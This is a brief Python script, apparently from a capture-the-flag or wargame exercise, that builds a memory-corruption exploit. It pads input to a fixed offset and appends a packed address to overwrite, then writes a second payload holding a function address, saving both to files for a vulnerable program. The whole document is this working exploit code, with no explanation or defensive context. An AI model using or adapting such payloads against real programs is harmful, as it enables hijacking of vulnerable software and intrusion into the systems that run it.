import struct

# Assume these values are found through your analysis

fun_address = 0x080484f4
address_to_change = 0x08049928
offset = 0x10 + 0x04
# Create the payload

payload = b"a" * offset
payload += struct.pack("<I", address_to_change)

payload2 = struct.pack("<I", fun_address)
# Save the payload to a file or pass it directly to the vulnerable program
with open('payload', 'wb') as f:
    f.write(payload)

with open('payload2', 'wb') as g:
    g.write(payload2)
